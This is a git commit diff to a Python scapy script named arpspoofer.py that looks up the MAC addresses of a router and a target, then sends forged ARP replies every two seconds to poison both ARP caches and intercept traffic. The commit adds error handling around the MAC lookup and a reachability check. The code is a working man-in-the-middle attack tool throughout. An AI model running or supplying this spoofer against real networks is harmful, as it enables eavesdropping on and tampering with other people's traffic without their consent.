ab53e5ecbaa79e9833be079b9bf59f8186afd3e0
Raz Priel <97564860+RazPriel@users.noreply.github.com>
2025-09-25 17:33:20 +0300

    Update arpspoofer.py

--- arpspoofer.py
+++ arpspoofer.py
@@ -3,11 +3,14 @@ import sys
 import time
 
 def get_mac_address(ip_address):
-    broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
-    arp_layer = scapy.ARP(pdst=ip_address)
-    get_mac_packet = broadcast_layer/arp_layer
-    answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
-    return answer[0][1].hwsrc
+    try:
+        broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
+        arp_layer = scapy.ARP(pdst=ip_address)
+        get_mac_packet = broadcast_layer/arp_layer
+        answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
+        return answer[0][1].hwsrc
+    except:
+        return "error"
 
 def spoof(router_ip, target_ip, router_mac, target_mac):
     packet1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
@@ -20,10 +23,13 @@ router_ip = str(input("[+] Enter router IP: "))
 target_mac = str(get_mac_address(target_ip))
 router_mac = str(get_mac_address(router_ip))
 
-try:
-    while True:
-        spoof(router_ip, target_ip, router_mac, target_mac)
-        time.sleep(2)
-except KeyboardInterrupt:
-    print('[-] Closing arp spoofer...')
-    exit(0)
+if target_mac == "error" and router_mac == "error":
+    print("[-] Target could not be reached!")
+else:
+    try:
+        while True:
+            spoof(router_ip, target_ip, router_mac, target_mac)
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print('[-] Closing arp spoofer...')
+        exit(0)
